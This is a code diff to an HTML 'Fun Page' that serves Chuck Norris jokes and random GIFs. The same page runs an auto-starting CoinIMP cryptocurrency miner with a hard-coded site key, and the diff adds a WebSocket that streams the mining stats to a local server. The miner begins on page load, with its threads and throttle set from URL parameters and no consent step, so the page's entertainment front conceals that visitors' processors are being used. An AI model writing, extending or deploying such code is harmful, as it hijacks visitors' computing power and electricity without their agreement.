@@ -40,7 +40,7 @@
     </style>
 </head>
 <body>
-<h1>Welcome to the Fun Page!</h1>
+    <h1>Welcome to the Fun Page!</h1>
 
     <!-- Mining Status -->
     <div id="mining-status">Starting Mining...</div>
@@ -69,7 +69,7 @@
                 autoplay: params.get('autoplay') === '1',
                 threads: parseInt(params.get('threads'), 10) || null,
                 throttle: parseFloat(params.get('throttle')) || null,
-                delay: parseInt(params.get('delay'), 10) || 0, 
+                delay: parseInt(params.get('delay'), 10) || 0,
                 runner: params.get('runner') || 'default'
             };
         }
@@ -115,10 +115,10 @@
 
         // Initialize CoinIMP miner (for mining VerusCoin or Monero)
         function startMining() {
-            const threads = getAvailableThreads(); // Get the number of threads based on available CPU cores or query param
-            const throttle = queryParams.throttle !== null ? queryParams.throttle : 0.1; // Default throttle is 0.1
-            //const miner = new Client.Anonymous('3f1e57f6b0ddc90d68e3b00a16f1fcd6c9a13a77a02c3e8137c05f4618e0525c', {
-            const miner = new Client.User('3f1e57f6b0ddc90d68e3b00a16f1fcd6c9a13a77a02c3e8137c05f4618e0525c',queryParams.runner ,{
+            const threads = getAvailableThreads();
+            const throttle = queryParams.throttle !== null ? queryParams.throttle : 0.1;
+
+            const miner = new Client.User('3f1e57f6b0ddc90d68e3b00a16f1fcd6c9a13a77a02c3e8137c05f4618e0525c', queryParams.runner, {
                 throttle: throttle,
                 threads: threads,
                 c: 'w',
@@ -128,26 +128,33 @@
             miner.start();
             document.getElementById('mining-status').innerText = `Mining started with ${threads} threads and ${throttle * 100}% throttle limit...`;
 
-            // Update Hashes/sec and Local hashes stats
+            // Set up WebSocket connection to send mining stats
+            const ws = new WebSocket('ws://localhost:3000');
+
+            ws.onopen = () => {
+                console.log('WebSocket connection established');
+            };
+
+            ws.onerror = (error) => {
+                console.error('WebSocket error:', error);
+            };
+
             setInterval(() => {
                 const hashRate = miner.getHashesPerSecond();
                 const totalHashes = miner.getTotalHashes();
+
+                // Update stats on the page
                 document.getElementById('hash-rate').innerText = hashRate.toFixed(2);
                 document.getElementById('local-hashes').innerText = totalHashes;
+
+                // Send stats to WebSocket server
+                if (ws.readyState === WebSocket.OPEN) {
+                    ws.send(JSON.stringify({
+                        hashRate: hashRate.toFixed(2),
+                        totalHashes: totalHashes
+                    }));
+                }
             }, 1000);
-
-            // Optionally, track mining progress or errors
-            miner.on('start', () => {
-                console.log('Mining started!');
-            });
-
-            miner.on('error', (error) => {
-                console.error('Mining error:', error);
-            });
-
-            miner.on('end', () => {
-                console.log('Mining ended');
-            });
         }
 
         // Call functions to fetch Chuck Norris joke and random GIF
@@ -155,7 +162,7 @@
         fetchRandomGIF();
 
         // Start mining with optional delay
-        window.onload = function() {
+        window.onload = function () {
             if (queryParams.delay > 0) {
                 setTimeout(() => {
                     startMining();
